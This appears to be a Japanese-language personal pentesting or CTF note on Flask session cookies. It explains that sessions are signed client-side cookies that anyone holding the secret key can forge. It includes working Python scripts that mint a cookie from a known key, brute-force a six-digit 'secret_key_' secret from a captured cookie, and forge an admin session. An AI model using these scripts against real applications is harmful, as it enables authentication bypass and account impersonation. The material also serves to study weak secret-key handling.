# Flask

Flaskのセッション変数は、デフォルトではサーバー側で保持されておらず、Cookieの中に含まれており、署名を付けることで偽造を防いでいる。  
サーバー側で保持するには、Flask-Session などの拡張ライブラリが必要。

秘密鍵が知られれば、セッション変数を自由に偽造されてしまう。

秘密鍵とセッションCookie生成の実装が判明している場合に、ローカルでセッションCookieを生成する例

```python
#!/usr/bin/env python3
from flask import Flask, session, request
from waitress import serve
import requests, threading, time

#Flask Initialisation
app = Flask(__name__)
app.config["SECRET_KEY"] = "70a5411082ea8e48cc9e7f7d7c12f2c2"

@app.route("/")
def main():
    session["auth"] = "True"
    session["username"] = "Pentester"
    return "Check your cookies", 200

#Flask setup/start
thread = threading.Thread(target = lambda: serve(app, port=9000, host="127.0.0.1"))
thread.setDaemon(True)
thread.start()

#Request
time.sleep(1)
print(requests.get("http://localhost:9000/").cookies.get("session"))
```

## 秘密鍵をブルートフォースする例

秘密鍵が "secret_key_" + 6桁のランダム数字とわかっている場合。

```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

cookie = "eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYW5kZXJzIn0.aT-unA.KlmKdN10Z_9dViiFlHlcnXs_BMM"

def try_key(key):
    app = Flask(__name__)
    app.secret_key = key
    app.config["SECRET_KEY_FALLBACKS"] = []

    s = SecureCookieSessionInterface().get_signing_serializer(app)
    try:
        data = s.loads(cookie)
        return data  
    except Exception:
        return None

for i in range(100000, 1000000):
    if i % 10000 == 0:
        print(i)
    key = "secret_key_" + str(i)
    data = try_key(key)
    if data:
        print("[+] FOUND KEY:", key)
        print("[+] SESSION:", data)
        break
```

セッションCookieを生成

```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

class FakeApp:
    secret_key = b"secret_key_417759"
    config = {
        "SECRET_KEY_FALLBACKS": []
    }

app = FakeApp()

serializer = SecureCookieSessionInterface().get_signing_serializer(app)

cookie = serializer.dumps({
    "logged_in": True,
    "username": "admin"
})

print(cookie)
```

